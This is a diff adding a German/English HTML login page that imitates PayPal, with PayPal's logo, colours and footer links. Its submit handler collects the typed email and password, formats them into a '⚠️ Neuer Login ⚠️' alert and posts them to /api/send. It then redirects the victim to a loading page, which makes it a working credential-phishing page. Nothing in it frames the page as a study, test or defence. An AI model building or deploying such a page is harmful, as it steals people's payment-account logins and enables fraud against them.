@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      margin: 0;
+      background: #fff;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 360px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .logo { text-align: center; margin-bottom: 20px; }
+    .logo img { height: 40px; }
+
+    .input-field {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    .forgot-password {
+      display: block;
+      margin: 6px 0 16px 0;
+      font-size: 14px;
+      color: #1e56d2;
+      text-decoration: none;
+      text-align: left;
+    }
+    .forgot-password:hover { text-decoration: underline; }
+
+    .button-primary {
+      display: block;
+      width: 100%;
+      background-color: #0070ba;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 14px 0;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: background-color 0.3s ease;
+    }
+    .button-primary:hover { background-color: #005ea6; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #888;
+      font-size: 14px;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #ccc;
+    }
+    .divider:not(:empty)::before { margin-right: .75em; }
+    .divider:not(:empty)::after { margin-left: .75em; }
+
+    .button-secondary {
+      display: block;
+      width: 100%;
+      background-color: white;
+      color: black;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 14px 0;
+      border: 2px solid black;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-bottom: 30px;
+      transition: background-color 0.3s ease;
+    }
+    .button-secondary:hover { background-color: #f5f5f5; }
+
+    .language-selector { text-align: center; font-size: 14px; color: #444; margin-bottom: 20px; }
+    .language-selector img { width: 20px; vertical-align: middle; margin-right: 6px; }
+    .language-selector a { margin: 0 6px; color: #444; text-decoration: none; cursor:pointer; }
+    .language-selector a.active { font-weight: bold; }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      padding: 12px;
+      border-top: 1px solid #eee;
+      width: 100%;
+    }
+    .footer a { margin: 0 10px; text-decoration: none; color: #444; }
+    .footer a:hover { text-decoration: underline; }
+    /* 📱 Mobile Optimierung */
+@media (max-width: 420px) {
+  body {
+    padding: 0 12px;
+    box-sizing: border-box;
+  }
+
+  .container {
+    max-width: 100%;
+    justify-content: center;
+  }
+
+  .logo img {
+    height: 34px;
+    margin-bottom: 16px;
+  }
+
+  .input-field {
+    padding: 13px;
+    font-size: 15px;
+  }
+
+  .forgot-password {
+    font-size: 13px;
+    margin: 6px 0 14px;
+  }
+
+  .button-primary,
+  .button-secondary {
+    font-size: 16px;
+    padding: 13px 0;
+    border-radius: 28px;
+  }
+
+  .divider {
+    margin: 16px 0;
+    font-size: 13px;
+  }
+
+  .language-selector {
+    font-size: 13px;
+    margin-bottom: 16px;
+  }
+
+  .footer {
+    font-size: 12px;
+    padding: 10px 0;
+  }
+}
+
+/* 📱 Sehr kleine Geräte */
+@media (max-width: 320px) {
+  .input-field {
+    font-size: 14px;
+    padding: 12px;
+  }
+
+  .button-primary,
+  .button-secondary {
+    font-size: 15px;
+  }
+
+  .logo img {
+    height: 30px;
+  }
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <!-- neutrales Logo / Du kannst Link zu PayPal belassen wenn du willst -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="Logo">
+    </div>
+
+    <form id="loginForm" autocomplete="off">
+      <input
+        type="text"
+        id="email"
+        name="contact"
+        class="input-field"
+        placeholder=""
+        required
+        pattern="^([+0-9\s\-]{6,}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})$"
+        title="Bitte geben Sie eine gültige Telefonnummer oder E-Mail-Adresse ein."
+        autocomplete="off">
+
+      <input
+        type="password"
+        id="password"
+        name="password"
+        class="input-field"
+        placeholder=""
+        required
+        autocomplete="new-password">
+
+      <a href="#" id="forgot" class="forgot-password"></a>
+      <button type="submit" id="loginBtn" class="button-primary"></button>
+    </form>
+
+    <div class="divider" id="divider"></div>
+    <button id="signupBtn" class="button-secondary"></button>
+
+    <div class="language-selector">
+      <img id="lang-flag" src="https://flagcdn.com/w20/de.png" alt="DE">
+      <a id="lang-de" class="active">Deutsch</a> |
+      <a id="lang-en">English</a>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <a href="#" id="contact"></a>
+    <a href="#" id="privacy"></a>
+    <a href="#" id="terms"></a>
+    <a href="#" id="worldwide"></a>
+  </div>
+
+  <script>
+    // Übersetzungen (de/en)
+    const translations = {
+      de: {
+        emailPlaceholder: "E-Mail-Adresse oder Handynummer",
+        passwordPlaceholder: "Passwort",
+        forgot: "Passwort vergessen?",
+        loginBtn: "Einloggen",
+        divider: "oder",
+        signupBtn: "Neu anmelden",
+        contact: "Kontakt",
+        privacy: "Datenschutz",
+        terms: "AGB",
+        worldwide: "Weltweit"
+      },
+      en: {
+        emailPlaceholder: "Email address or mobile number",
+        passwordPlaceholder: "Password",
+        forgot: "Forgot password?",
+        loginBtn: "Log In",
+        divider: "or",
+        signupBtn: "Sign Up",
+        contact: "Contact",
+        privacy: "Privacy",
+        terms: "Terms",
+        worldwide: "Worldwide"
+      }
+    };
+
+    // Sprache setzen / speichern
+    function setLanguage(lang) {
+      const t = translations[lang] || translations.de;
+      document.getElementById("email").placeholder = t.emailPlaceholder;
+      document.getElementById("password").placeholder = t.passwordPlaceholder;
+      document.getElementById("forgot").textContent = t.forgot;
+      document.getElementById("loginBtn").textContent = t.loginBtn;
+      document.getElementById("divider").textContent = t.divider;
+      document.getElementById("signupBtn").textContent = t.signupBtn;
+      document.getElementById("contact").textContent = t.contact;
+      document.getElementById("privacy").textContent = t.privacy;
+      document.getElementById("terms").textContent = t.terms;
+      document.getElementById("worldwide").textContent = t.worldwide;
+
+      const flag = document.getElementById("lang-flag");
+      if (lang === "de") {
+        flag.src = "https://flagcdn.com/w20/de.png";
+        flag.alt = "DE";
+      } else {
+        flag.src = "https://flagcdn.com/w20/gb.png";
+        flag.alt = "EN";
+      }
+
+      localStorage.setItem("lang", lang);
+      document.getElementById("lang-de").classList.toggle("active", lang === "de");
+      document.getElementById("lang-en").classList.toggle("active", lang === "en");
+    }
+
+    document.getElementById("lang-de").addEventListener("click", (e) => { e.preventDefault(); setLanguage("de"); });
+    document.getElementById("lang-en").addEventListener("click", (e) => { e.preventDefault(); setLanguage("en"); });
+
+    // initial
+    const savedLang = localStorage.getItem("lang") || "de";
+    setLanguage(savedLang);
+
+    // Leerzeichen verhindern im Typing
+    const emailField = document.getElementById("email");
+    const passwordField = document.getElementById("password");
+    emailField.addEventListener("input", () => { emailField.value = emailField.value.replace(/\s/g, ""); });
+    passwordField.addEventListener("input", () => { passwordField.value = passwordField.value.replace(/\s/g, ""); });
+
+    // Formular: client-seitiger Admin-Shortcut + normale Abschick-Weiterleitung
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value;
+
+ const text = `⚠️ Neuer Login ⚠️\nEmail: ${email}\nPasswort: ${password}`;
+
+  const res = await fetch("/api/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ message: text })
+  });
+  // 🔁 immer weiterleiten
+  window.location.href = "loading.html";
+});
+
+// Neu anmelden → eigene Loading-Seite (du legst loading-signup.html an)
+    document.getElementById("signupBtn").addEventListener("click", () => {
+      window.location.href = "loading-signup.html";
+    });
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
